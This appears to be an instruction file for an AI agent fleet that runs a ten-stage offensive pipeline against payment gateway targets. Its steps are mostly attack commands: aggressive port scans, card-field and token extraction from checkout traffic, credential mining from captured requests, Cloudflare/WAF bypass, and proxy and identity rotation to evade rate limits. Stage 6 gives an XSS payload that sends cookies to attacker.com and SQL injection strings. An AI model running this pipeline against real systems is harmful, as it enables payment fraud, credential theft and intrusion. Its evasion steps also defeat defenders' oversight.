# pipeline-runner — 10-Stage Engagement Pipeline Executor

---

## Overview

The pipeline-runner skill executes OpenClaw's complete 10-stage engagement pipeline against authorized payment gateway targets. Each stage builds on the previous, progressing from passive OSINT through dark web intelligence to structured reporting.

**Pipeline Flow:**
```
STAGE 1 → STAGE 2 → STAGE 3 → STAGE 4 → STAGE 5
   ↓        ↓        ↓        ↓        ↓
STAGE 10 ← STAGE 9 ← STAGE 8 ← STAGE 7 ← STAGE 6
```

---

## Trigger Conditions

Activate pipeline-runner when:
- Operator sends `PIPELINE RUN -t target.com`
- Automated bot escalation: RECON → INTEL → HUNTER chain completes
- Reece approves new engagement via Telegram
- Existing engagement needs re-run or refresh
- New P1 target requires full intelligence cycle

**Do NOT run pipeline if:**
- Target not in `authorized_domains` in `engagement_config.json`
- `engagement_status` is not `ACTIVE`
- Reece approval flag is not `APPROVED`

---

## Master Command

### Basic Run
```bash
cd /root/.nanobot/workspace/openclaw-brain-v2/pipeline
python master_pipeline.py -t target.com --config engagement_config.json
```

### Full Options
```bash
python master_pipeline.py \
  -t target.com \
  --config engagement_config.json \
  --stages 1-10 \
  --output-dir reports/ \
  --threads 4 \
  --verbose
```

### Stage-Specific Run
```bash
# Run only stages 1-5 (OSINT through extraction)
python master_pipeline.py -t target.com --stages 1-5

# Run only stages 6-10 (evasion through output)
python master_pipeline.py -t target.com --stages 6-10

# Run single stage
python master_pipeline.py -t target.com --stages 3
```

---

## Pre-Engagement Checks

### Step 1 — Authorization Verification
```bash
#!/bin/bash
TARGET="$1"
CONFIG="pipeline/engagement_config.json"

# Check target is authorized
AUTHORIZED=$(jq -r '.authorized_domains[]' "$CONFIG")
if ! echo "$AUTHORIZED" | grep -qx "$TARGET"; then
  echo "FATAL: Target $TARGET not in authorized_domains"
  echo "Add to $CONFIG first."
  exit 1
fi

# Check engagement status
STATUS=$(jq -r '.engagement_status' "$CONFIG")
if [ "$STATUS" != "ACTIVE" ]; then
  echo "FATAL: Engagement status is $STATUS (need ACTIVE)"
  exit 1
fi

# Check Reece approval
APPROVAL=$(jq -r '.approval' "$CONFIG")
if [ "$APPROVAL" != "APPROVED" ]; then
  echo "FATAL: Reece has not approved this engagement"
  exit 1
fi

echo "✅ Authorization verified"
```

### Step 2 — Configuration Validation
```bash
# Verify engagement_config.json structure
jq -e '.engagement_name != "default"' pipeline/engagement_config.json && \
  echo "✅ Engagement name set"

jq -e '.authorized_domains | length > 0' pipeline/engagement_config.json && \
  echo "✅ Authorized domains populated"

# Verify API keys are present
[ -n "$SHODAN_API_KEY" ] && echo "✅ SHODAN configured"
[ -n "$CENSYS_API_ID" ] && echo "✅ CENSYS configured"
[ -n "$GITHUB_PAT" ] && echo "✅ GitHub configured"

# Verify database
[ -f "reports/sqlite/engagement.db" ] && echo "✅ SQLite DB ready"
```

### Step 3 — Directory Setup
```bash
# Create output directories
mkdir -p "knowledge/gateway_profiles/$TARGET"
mkdir -p "knowledge/gateway_profiles/$TARGET/engagement_prep"
mkdir -p "knowledge/gateway_profiles/$TARGET/engagement_prep/evidence"
mkdir -p "knowledge/gateway_profiles/$TARGET/engagement_prep/payload_templates"
mkdir -p "reports/stage_outputs/$TARGET"
mkdir -p "memory/entities/$TARGET"
```

---

## Stage 1: OSINT — Open Source Intelligence

**Objective:** Gather all publicly available intelligence on target.

### Step 1.1 — Shodan Reconnaissance
```bash
# Scan target via Shodan
python3 -c "
import shodan
api = shodan.Shodan(os.getenv('SHODAN_API_KEY'))
results = api.search('ssl:\"{TARGET}\"')
for r in results['matches']:
    print(f\"IP: {r['ip_str']} Port: {r['port']} Product: {r.get('product','')}\")
" > "reports/stage_outputs/$TARGET/stage1_shodan.txt"

# Payment-specific Shodan queries
# ssl:"Stripe" port:443
# ssl:"Braintree" port:443
# product:"Payment Gateway"
# org:"Square" ssl:443
```

### Step 1.2 — Censys Certificate Search
```bash
# Certificate enumeration via Censys
curl -s -G "https:// censys.io/api/v1/search/certificates" \
  -d "q=parsed.names: {TARGET}" \
  -H "Authorization: Basic $(echo -n $CENSYS_API_ID:$CENSYS_API_SECRET | base64)" \
  > "reports/stage_outputs/$TARGET/stage1_censys.json"

# Extract subdomains from certs
jq -r '.results[].parsed.names[]' "reports/stage_outputs/$TARGET/stage1_censys.json" | \
  sort -u > "reports/stage_outputs/$TARGET/stage1_subdomains.txt"
```

### Step 1.3 — GitHub Reconnaissance
```bash
# GitHub code search
curl -s -H "Authorization: token $GITHUB_PAT" \
  "https://api.github.com/search/code?q={TARGET}+in:file" \
  | jq '.items[] | {name: .name, repo: .repository.full_name, url: .html_url}' \
  > "reports/stage_outputs/$TARGET/stage1_github.txt"

# GitHub dorks
# path:.env STRIPE_SECRET_KEY domain:{TARGET}
# filename:webhook.py payment domain:{TARGET}
```

### Step 1.4 — DNS Enumeration
```bash
# Passive DNS lookup
dig ANY $TARGET @8.8.8.8 +short

# Certificate Transparency
curl -s "https://crt.sh/?q=%25.{TARGET}&deduplicate=y" | \
  grep -oP '(?<=<td>)[^<]+(?=</td>)' | tail -n+4 | \
  sort -u > "reports/stage_outputs/$TARGET/stage1_ct.txt"

# DNS zone transfer attempt (if misconfigured)
dig NS $TARGET +short
```

### Step 1.5 — Stage 1 Output
```bash
# Aggregate all OSINT findings
cat > "knowledge/gateway_profiles/$TARGET/stage1_osint.json" << 'EOF'
{
  "target": "<TARGET>",
  "stage": 1,
  "timestamp": "<ISO8601>",
  "shodan_results": [],
  "censys_subdomains": [],
  "github_repos": [],
  "dns_records": [],
  "ct_certificates": [],
  "findings": []
}
EOF
```

---

## Stage 2: Asset Discovery — Enumerate Attack Surface

**Objective:** Map all reachable endpoints, ports, and services.

### Step 2.1 — Subdomain Enumeration
```bash
# amass passive scan
amass enum -passive -d $TARGET -o "reports/stage_outputs/$TARGET/stage2_amass.txt"

# subfinder
subfinder -d $TARGET -o "reports/stage_outputs/$TARGET/stage2_subfinder.txt"

# combine and deduplicate
cat "reports/stage_outputs/$TARGET/stage2_".txt | sort -u > \
  "reports/stage_outputs/$TARGET/stage2_all_subdomains.txt"
```

### Step 2.2 — Port Scanning
```bash
# Nmap fast scan (top 1000 ports)
nmap -sS -sV -T4 --top-ports 1000 \
  -oA "reports/stage_outputs/$TARGET/stage2_nmap" \
  $TARGET

# Nmap full scan (all ports, aggressive)
nmap -sS -sV -O -p- -T4 \
  -oA "reports/stage_outputs/$TARGET/stage2_nmap_full" \
  $TARGET

# Common payment ports
nmap -sS -p 443,8443,9443,8080,10443,8877,8888,7777 \
  -oA "reports/stage_outputs/$TARGET/stage2_payment_ports" \
  $TARGET
```

### Step 2.3 — Service Fingerprinting
```bash
# Whatweb for technology detection
whatweb -v -a 3 $TARGET > "reports/stage_outputs/$TARGET/stage2_whatweb.txt"

# Screenshot all web services
python3 neopay/scripts/screenshot.py \
  --targets "reports/stage_outputs/$TARGET/stage2_all_subdomains.txt" \
  --output "reports/stage_outputs/$TARGET/screenshots/"
```

### Step 2.4 — Tech Stack Identification
```bash
# Identify payment platform
python3 neopay/scripts/fingerprint.py --target $TARGET

# JA3 TLS fingerprinting
python3 -c "
from neopay.scripts.tls_fingerprint import get_ja3
print(get_ja3('$TARGET', 443))
"
```

---

## Stage 3: Crawling — Map Payment Endpoints

**Objective:** Discover all payment-related URLs, forms, and APIs.

### Step 3.1 — Web Crawling
```bash
# Gatling for payment endpoint enumeration
python3 neopay/scripts/gatling.py \
  --target "https://$TARGET" \
  --wordlist "neopay/assets/payment_endpoints.txt" \
  --output "reports/stage_outputs/$TARGET/stage3_endpoints.txt"

# Payment endpoints to find:
# /api/v1, /api/v2, /api/payment, /checkout, /payment/process
# /admin, /dashboard, /gateway, /merchant/login
# /webhook, /callback, /ipn, /notify
# /debug, /test, /sandbox
```

### Step 3.2 — Form Discovery
```bash
# Find all forms (payment, login, registration)
curl -s "https://$TARGET" | grep -oP '<form[^>]*action="[^"]*"' | \
  while read form; do
    echo "$form"
  done > "reports/stage_outputs/$TARGET/stage3_forms.txt"

# Identify payment form fields
grep -iE "card|cvv|expiry|pan|cc" "reports/stage_outputs/$TARGET/stage3_forms.txt"
```

### Step 3.3 — API Mapping
```bash
# Swagger/OpenAPI detection
curl -s "https://$TARGET/swagger.json" | jq .
curl -s "https://$TARGET/api-docs" | jq .
curl -s "https://$TARGET/api/v1/docs" | jq .

# GraphQL introspection
curl -s -X POST "https://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq .
```

---

## Stage 4: Dynamic Rendering — JavaScript-Heavy Targets

**Objective:** Render and analyze JS-heavy SPAs, checkout flows, and client-side payment logic.

### Step 4.1 — Playwright Rendering
```bash
# Render JS-heavy pages
python3 neopay/scripts/playwright_render.py \
  --url "https://$TARGET" \
  --output "reports/stage_outputs/$TARGET/stage4_rendered.html"

# Capture network requests
python3 neopay/scripts/playwright_traffic.py \
  --url "https://$TARGET/checkout" \
  --output "reports/stage_outputs/$TARGET/stage4_network.json"
```

### Step 4.2 — Checkout Flow Analysis
```bash
# Analyze Stripe/Braintree/Adyen integration
python3 neopay/scripts/checkout_analysis.py \
  --url "https://$TARGET/checkout" \
  --output "reports/stage_outputs/$TARGET/stage4_checkout.json"

# Extract payment tokens
python3 neopay/scripts/token_extractor.py \
  --traffic "reports/stage_outputs/$TARGET/stage4_network.json" \
  --output "reports/stage_outputs/$TARGET/stage4_tokens.txt"
```

### Step 4.3 — Single-Page App Mapping
```bash
# Map SPA routes
python3 neopay/scripts/spa_mapper.py \
  --url "https://$TARGET/admin" \
  --output "reports/stage_outputs/$TARGET/stage4_routes.json"

# Extract API calls from JavaScript bundles
curl -s "https://$TARGET/assets/app.js" | \
  grep -oE '(api|payment|checkout|token)["\x27/]+[a-zA-Z0-9/_-]+' | \
  sort -u > "reports/stage_outputs/$TARGET/stage4_api_calls.txt"
```

---

## Stage 5: Extraction — Data Pulling and Pattern ID

**Objective:** Extract data, identify patterns, and build intelligence profiles.

### Step 5.1 — Data Pattern Identification
```bash
# Extract token formats
python3 neopay/scripts/token_patterns.py \
  --targets "reports/stage_outputs/$TARGET/stage3_endpoints.txt" \
  --output "reports/stage_outputs/$TARGET/stage5_patterns.json"

# Identify protocol variants (ISO8583, SPDH, etc.)
python3 neopay/scripts/protocol_fingerprint.py \
  --target $TARGET \
  --output "reports/stage_outputs/$TARGET/stage5_protocol.json"
```

### Step 5.2 — Payment Flow Mapping
```bash
# Map transaction lifecycle
python3 neopay/scripts/payment_flow.py \
  --target $TARGET \
  --output "knowledge/gateway_profiles/$TARGET/payment_flow_mapping.json"
```

### Step 5.3 — Credential Pattern Mining
```bash
# Extract API keys, tokens from JavaScript
grep -rE "(api[_-]?key|token|secret|password)" \
  "reports/stage_outputs/$TARGET/stage4_network.json" | \
  jq -r '.[].value' | sort -u > \
  "reports/stage_outputs/$TARGET/stage5_credentials.txt"
```

---

## Stage 6: Evasion — WAF Bypass and Rate Limiting

**Objective:** Develop evasion techniques for WAF, IPS, and rate limits.

### Step 6.1 — WAF Fingerprinting
```bash
# Detect and fingerprint WAF
python3 neopay/scripts/waf_detect.py --target $TARGET

# Common WAFs:
# Imperva: X-CDN: Imperva, __cfduid cookie
# Cloudflare: cf-ray, __cf_bm cookie
# Akamai: X-Akamai-..., Akamai Ghost
# F5 ASM: TS cookie, BigIP cookie
```

### Step 6.2 — Bypass Techniques
```bash
# Cloudflare bypass
python3 neopay/scripts/cf_bypass.py --target $TARGET

# WAF bypass (XSS)
<img src=x onerror=fetch('https://attacker.com?x='+document.cookie)>

# SQL injection bypass
' OR '1'='1' --
' OR 1=1 --
' UNION SELECT NULL,@@version--
```

### Step 6.3 — Rate Limit Circumvention
```bash
# User-agent rotation
python3 neopay/scripts/ua_rotate.py --wordlist useragents.txt

# Proxy rotation
python3 neopay/scripts/proxy_rotate.py \
  --proxies "proxies.txt" \
  --target $TARGET

# Timing randomization
python3 -c "import random; time.sleep(random.uniform(2, 5))"
```

---

## Stage 7: Distributed — Multi-Source Scaling

**Objective:** Scale intelligence gathering across multiple sources and identities.

### Step 7.1 — Multi-API Source Aggregation
```bash
# Aggregate Shodan, Censys, BinaryEdge, SecurityTrails
python3 neopay/scripts/multi_api_scan.py \
  --target $TARGET \
  --apis shodan,censys,binaryedge \
  --output "reports/stage_outputs/$TARGET/stage7_distributed.json"
```

### Step 7.2 — Identity Rotation
```bash
# Rotate identities for broader scanning
python3 neopay/scripts/identity_rotate.py \
  --count 10 \
  --target $TARGET

# Each identity: different IP, UA, geo-location
```

---

## Stage 8: Dark Web — Tor and I2P Payment Discovery

**Objective:** Discover payment services on dark web, find leaks and criminal infrastructure.

### Step 8.1 — Tor Service Discovery
```bash
# Tor hidden service enumeration
python3 neopay/scripts/tor_scanner.py \
  --target $TARGET \
  --onion "reports/stage_outputs/$TARGET/stage8_onion.txt"

# Search for payment service .onion mirrors
# target.onion
# payment-target.onion
# checkout-target.onion
```

### Step 8.2 — I2P Service Discovery
```bash
# I2P service scanning
python3 neopay/scripts/i2p_scanner.py \
  --target $TARGET \
  --i2p_destination "reports/stage_outputs/$TARGET/stage8_i2p.txt"
```

### Step 8.3 — Dark Web Intelligence
```bash
# Search dark web forums for payment gateway mentions
python3 neopay/scripts/darkweb_search.py \
  --query "$TARGET payment gateway" \
  --output "reports/stage_outputs/$TARGET/stage8_intel.txt"
```

---

## Stage 9: AI Enrichment — Threat Intelligence Correlation

**Objective:** Correlate findings with threat intelligence feeds and CVE databases.

### Step 9.1 — CVE Matching
```bash
# Match identified tech stack against CVE database
python3 neopay/scripts/cve_match.py \
  --tech_stack "knowledge/gateway_profiles/$TARGET/tech_stack.json" \
  --output "knowledge/gateway_profiles/$TARGET/cve_findings.json"
```

### Step 9.2 — Threat Feed Correlation
```bash
# Correlate with threat intelligence
python3 neopay/scripts/threat_correlate.py \
  --target $TARGET \
  --feeds abuseipdb,virustotal,alienvault \
  --output "reports/stage_outputs/$TARGET/stage9_threat_intel.json"
```

### Step 9.3 — Breach Data Correlation
```bash
# Check if target appears in breach data
python3 neopay/scripts/breach_check.py \
  --domain $TARGET \
  --output "reports/stage_outputs/$TARGET/stage9_breach.json"
```

---

## Stage 10: Output — Structured Reports and Database

**Objective:** Generate structured reports and persist findings to database.

### Step 10.1 — Report Generation
```bash
# Generate markdown report
python3 neopay/scripts/report_gen.py \
  --target $TARGET \
  --stages 1-10 \
  --output "knowledge/gateway_profiles/$TARGET/REPORT.md"

# Generate JSON report for automation
python3 neopay/scripts/report_gen.py \
  --target $TARGET \
  --format json \
  --output "knowledge/gateway_profiles/$TARGET/REPORT.json"
```

### Step 10.2 — Database Persistence
```bash
# Log to SQLite database
python3 -c "
import sqlite3
conn = sqlite3.connect('reports/sqlite/engagement.db')
c = conn.cursor()
c.execute('''
  INSERT INTO reports
  (engagement_name, stage, tool_used, output_file, status, timestamp)
  VALUES (?, ?, ?, ?, ?, datetime('now'))
''', ('<engagement_name>', 10, 'report_gen.py',
       'knowledge/gateway_profiles/<TARGET>/REPORT.md', 'complete'))
conn.commit()
conn.close()
"

# Verify database write
sqlite3 reports/sqlite/engagement.db \
  "SELECT * FROM reports WHERE engagement_name='<engagement_name>'"
```

### Step 10.3 — Memory Persistence
```bash
# Write to memory/entities/<target>/
cat > "memory/entities/$TARGET/intelligence.json" << 'EOF'
{
  "target": "<TARGET>",
  "last_updated": "<ISO8601>",
  "pipeline_run": "<version>",
  "stages_completed": [1,2,3,4,5,6,7,8,9,10],
  "key_findings": [],
  "attack_surface_score": <0-100>,
  "recommended_actions": []
}
EOF
```

---

## Database Schema

```sql
CREATE TABLE reports (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  engagement_name TEXT NOT NULL,
  stage INTEGER NOT NULL,
  tool_used TEXT,
  output_file TEXT,
  status TEXT DEFAULT 'pending',
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE findings (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  engagement_name TEXT NOT NULL,
  target TEXT NOT NULL,
  finding_type TEXT,
  severity TEXT,
  description TEXT,
  evidence_file TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

---

## Output Locations

| Output Type | Location |
|---|---|
| Gateway profiles | `knowledge/gateway_profiles/<target>/` |
| Stage outputs | `reports/stage_outputs/<target>/` |
| Evidence | `knowledge/gateway_profiles/<target>/engagement_prep/evidence/` |
| Database | `reports/sqlite/engagement.db` |
| Memory entities | `memory/entities/<target>/` |
| Activity logs | `knowledge/bot_activity_logs/` |

---

## Troubleshooting

| Error | Diagnosis | Fix |
|---|---|---|
| `amass: command not found` | Tool not installed | Install: `go install github.com/OWASP/Amass/v3/...@latest` |
| `SHODAN_API_KEY not set` | Missing API key | Add to `.env`: `export SHODAN_API_KEY=...` |
| `Censys API: rate limited` | Too many requests | Add delay between requests, use cache |
| `Playwright timeout` | JS-heavy page, slow render | Increase `--timeout` flag |
| `Database locked` | Concurrent access | Wait, retry with `--wait` flag |
| `Nmap: permission denied` | Requires root | Run with `sudo` or setcap |

---

## Cross-References

- **BOTS.md** — Bot fleet integration
- **pipeline/master_pipeline.py** — Master orchestrator script
- **pipeline/stages/** — Individual stage implementations
- **bot_intel.md** — INTEL scoring (pipeline feeds into bot system)
- **bot_hunter.md** — HUNTER exploitation (pipeline outputs feed HUNTER)
- **OPSEC.md** — OPSEC sanitization before git push
